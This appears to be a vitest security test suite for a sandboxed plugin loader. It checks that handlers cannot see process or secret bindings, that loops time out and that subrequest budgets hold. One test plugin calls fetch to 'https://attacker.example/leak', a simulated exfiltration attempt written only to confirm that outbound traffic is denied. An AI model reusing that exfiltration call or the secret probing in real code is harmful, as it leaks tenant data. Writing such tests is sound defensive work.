import { mkdtemp, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it, vi } from "vitest";
import { ScopedRuntimeLimitError, bundlePlugin, runScopedHandler } from "../src/index.js";

describe("loader security suite", () => {
  it("does not expose process, raw secret bindings, or global namespaces", async () => {
    const bundle = await bundleFromSource(`
      exports.handlers = {
        "invoice.created": () => ({
          processVisible: typeof process !== "undefined",
          secretVisible: typeof SLACK_BOT_TOKEN !== "undefined",
          otherPluginVisible: typeof OTHER_PLUGIN_NAMESPACE !== "undefined"
        })
      };
    `);

    await expect(
      runScopedHandler({
        bundleCode: bundle,
        handlerName: "invoice.created",
        payload: {},
        context: { capability: vi.fn() }
      })
    ).resolves.toMatchObject({
      value: {
        processVisible: false,
        secretVisible: false,
        otherPluginVisible: false
      }
    });
  });

  it("denies raw outbound fetch and keeps an audit entry", async () => {
    const bundle = await bundleFromSource(`
      exports.handlers = {
        "invoice.created": async () => {
          try {
            await fetch("https://attacker.example/leak");
          } catch (_error) {
            return "blocked";
          }
        }
      };
    `);

    await expect(
      runScopedHandler({
        bundleCode: bundle,
        handlerName: "invoice.created",
        payload: {},
        context: { capability: vi.fn() }
      })
    ).resolves.toEqual({
      value: "blocked",
      logs: [{ reason: "egress_denied", target: "https://attacker.example/leak" }]
    });
  });

  it("maps infinite-loop handlers to timeout execution status", async () => {
    const bundle = await bundleFromSource(`
      exports.handlers = {
        "invoice.created": () => {
          while (true) {}
        }
      };
    `);

    await expect(
      runScopedHandler({
        bundleCode: bundle,
        handlerName: "invoice.created",
        payload: {},
        context: { capability: vi.fn() },
        limits: { timeoutMs: 10 }
      })
    ).rejects.toMatchObject({
      executionStatus: "timeout"
    });
  });

  it("blocks capability calls beyond the loader subrequest budget", async () => {
    const bundle = await bundleFromSource(`
      exports.handlers = {
        "invoice.created": async (_payload, context) => {
          await context.capability("slack.send", { channel: "C123", text: "first" });
          await context.capability("slack.send", { channel: "C123", text: "second" });
        }
      };
    `);

    await expect(
      runScopedHandler({
        bundleCode: bundle,
        handlerName: "invoice.created",
        payload: {},
        context: { capability: vi.fn().mockResolvedValue({ ok: true }) },
        limits: { maxSubrequests: 1 }
      })
    ).rejects.toMatchObject({
      executionStatus: "budget_exceeded",
      logs: [{ reason: "subrequest_limit_exceeded", target: "capability:slack.send" }]
    } satisfies Partial<ScopedRuntimeLimitError>);
  });
});

async function bundleFromSource(source: string) {
  const dir = await mkdtemp(join(tmpdir(), "tenantscript-loader-security-"));
  const entry = join(dir, "plugin.cjs");
  await writeFile(entry, source);
  const bundled = await bundlePlugin(entry);
  const code = await readFile(entry, "utf8");
  expect(bundled.sha256).toMatch(/^[a-f0-9]{64}$/);
  return code;
}
